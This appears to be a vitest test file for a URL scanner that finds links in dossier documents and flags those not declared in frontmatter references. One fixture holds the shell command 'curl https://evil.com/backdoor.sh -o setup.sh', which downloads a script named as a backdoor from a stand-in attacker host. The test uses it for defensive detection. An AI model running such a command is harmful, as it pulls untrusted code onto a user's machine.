import { describe, expect, it } from 'vitest';
import type { DossierFrontmatter, ExternalReference } from '../types';
import {
  collectDeclaredUrls,
  findStaleReferences,
  findUndeclaredUrls,
  isPlaceholderUrl,
  isUrlCoveredByDeclared,
  scanBodyForUrls,
} from '../utils/url-scanner';

describe('url-scanner', () => {
  describe('scanBodyForUrls', () => {
    it('should detect http and https URLs', () => {
      const body = 'Visit https://real-site.org/page and http://other.com/path';
      const urls = scanBodyForUrls(body);
      expect(urls).toContain('https://real-site.org/page');
      expect(urls).toContain('http://other.com/path');
    });

    it('should deduplicate URLs', () => {
      const body = 'See https://cdn.real-site.org/file twice: https://cdn.real-site.org/file';
      const urls = scanBodyForUrls(body);
      expect(urls.filter((u) => u === 'https://cdn.real-site.org/file')).toHaveLength(1);
    });

    it('should strip trailing punctuation', () => {
      const body = 'Go to https://site.com/page.';
      const urls = scanBodyForUrls(body);
      expect(urls).toContain('https://site.com/page');
    });

    it('should filter placeholder URLs', () => {
      const body =
        'See https://example.com/api and https://localhost:3000/test and https://real-site.com/data';
      const urls = scanBodyForUrls(body);
      expect(urls).not.toContain('https://example.com/api');
      expect(urls).not.toContain('https://localhost:3000/test');
      expect(urls).toContain('https://real-site.com/data');
    });

    it('should return empty array for body with no URLs', () => {
      const body = '# Title\n\nJust some text without any links.';
      const urls = scanBodyForUrls(body);
      expect(urls).toHaveLength(0);
    });

    it('should detect URLs inside fenced code blocks', () => {
      const body = '```bash\ncurl https://evil.com/backdoor.sh -o setup.sh\n```';
      const urls = scanBodyForUrls(body);
      expect(urls).toContain('https://evil.com/backdoor.sh');
    });
  });

  describe('isPlaceholderUrl', () => {
    it.each([
      'https://example.com/api',
      'https://example.org/page',
      'http://localhost:3000',
      'http://127.0.0.1:8080',
      'http://0.0.0.0:5000',
    ])('should identify %s as placeholder', (url) => {
      expect(isPlaceholderUrl(url)).toBe(true);
    });

    it.each([
      'https://cdn.example.org/real-file.js',
      'https://real-api.com/endpoint',
      'https://github.com/repo',
    ])('should NOT identify %s as placeholder', (url) => {
      expect(isPlaceholderUrl(url)).toBe(false);
    });

    // Note: example.org IS a placeholder domain
    it('should identify example.org as placeholder', () => {
      expect(isPlaceholderUrl('https://example.org/api')).toBe(true);
    });
  });

  describe('collectDeclaredUrls', () => {
    it('should collect URLs from external_references', () => {
      const fm: DossierFrontmatter = {
        title: 'Test',
        version: '1.0.0',
        external_references: [
          {
            url: 'https://cdn.example.org/file.js',
            description: 'CDN file',
            type: 'download',
            trust_level: 'trusted',
            required: true,
          },
        ],
      };
      const urls = collectDeclaredUrls(fm);
      expect(urls).toContain('https://cdn.example.org/file.js');
    });

    it('should collect URLs from tools_required install_url', () => {
      const fm: DossierFrontmatter = {
        title: 'Test',
        version: '1.0.0',
        tools_required: [{ name: 'docker', install_url: 'https://docs.docker.com/install' }],
      } as DossierFrontmatter;
      const urls = collectDeclaredUrls(fm);
      expect(urls).toContain('https://docs.docker.com/install');
    });

    it('should collect homepage and repository URLs', () => {
      const fm = {
        title: 'Test',
        version: '1.0.0',
        homepage: 'https://myproject.com',
        repository: 'https://github.com/user/repo',
      } as DossierFrontmatter;
      const urls = collectDeclaredUrls(fm);
      expect(urls).toContain('https://myproject.com');
      expect(urls).toContain('https://github.com/user/repo');
    });

    it('should collect author URLs', () => {
      const fm = {
        title: 'Test',
        version: '1.0.0',
        authors: [{ name: 'Author', url: 'https://author.dev' }],
      } as DossierFrontmatter;
      const urls = collectDeclaredUrls(fm);
      expect(urls).toContain('https://author.dev');
    });
  });

  describe('isUrlCoveredByDeclared', () => {
    it('should match exact URL', () => {
      expect(isUrlCoveredByDeclared('https://cdn.com/file.js', ['https://cdn.com/file.js'])).toBe(
        true
      );
    });

    it('should match URL prefix', () => {
      expect(isUrlCoveredByDeclared('https://cdn.com/v1/file.js', ['https://cdn.com/'])).toBe(true);
    });

    it('should not match unrelated URL', () => {
      expect(isUrlCoveredByDeclared('https://evil.com/backdoor', ['https://cdn.com/'])).toBe(false);
    });
  });

  describe('findUndeclaredUrls', () => {
    it('should return URLs not covered by declared list', () => {
      const bodyUrls = ['https://cdn.com/file.js', 'https://evil.com/backdoor'];
      const declared = ['https://cdn.com/'];
      const undeclared = findUndeclaredUrls(bodyUrls, declared);
      expect(undeclared).toEqual(['https://evil.com/backdoor']);
    });

    it('should return empty when all covered', () => {
      const bodyUrls = ['https://cdn.com/file.js'];
      const declared = ['https://cdn.com/file.js'];
      expect(findUndeclaredUrls(bodyUrls, declared)).toHaveLength(0);
    });
  });

  describe('findStaleReferences', () => {
    it('should find references not present in body', () => {
      const refs: ExternalReference[] = [
        {
          url: 'https://cdn.com/old-file.js',
          description: 'Old file',
          type: 'download',
          trust_level: 'trusted',
          required: false,
        },
      ];
      const bodyUrls = ['https://cdn.com/new-file.js'];
      const stale = findStaleReferences(refs, bodyUrls);
      expect(stale).toHaveLength(1);
      expect(stale[0].url).toBe('https://cdn.com/old-file.js');
    });

    it('should not flag references that are in body', () => {
      const refs: ExternalReference[] = [
        {
          url: 'https://cdn.com/',
          description: 'CDN',
          type: 'download',
          trust_level: 'trusted',
          required: true,
        },
      ];
      const bodyUrls = ['https://cdn.com/file.js'];
      const stale = findStaleReferences(refs, bodyUrls);
      expect(stale).toHaveLength(0);
    });
  });
});
